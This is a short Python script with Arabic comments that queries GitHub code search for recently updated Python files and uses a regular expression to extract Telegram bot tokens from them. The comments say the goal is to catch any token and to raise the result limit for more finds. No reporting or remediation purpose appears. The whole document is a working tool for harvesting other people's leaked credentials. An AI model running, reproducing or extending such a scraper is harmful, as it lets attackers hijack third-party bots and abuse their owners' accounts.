import re
from github import Github

def search_for_tokens(token):
    g = Github(token)
    
    # هنا السر: نبحث عن النمط مباشرة دون قيود كلمات مفتاحية
    # سنبحث عن ملفات بايثون فقط ونفحص محتواها بالكامل
    query = 'language:python'
    
    found_tokens = []
    try:
        # البحث في المستودعات المحدثة مؤخراً (sort:updated)
        result = g.search_code(query=query, sort='updated', order='desc')
        
        for content_file in result[:20]: # رفعنا الحد لزيادة النتائج
            try:
                content = content_file.decoded_content.decode('utf-8')
                # النمط الشامل لأي توكن تيليجرام
                tokens = re.findall(r'[0-9]{5,15}:[a-zA-Z0-9_-]{30,40}', content)
                found_tokens.extend(tokens)
            except:
                continue
    except:
        pass
            
    return list(set(found_tokens))
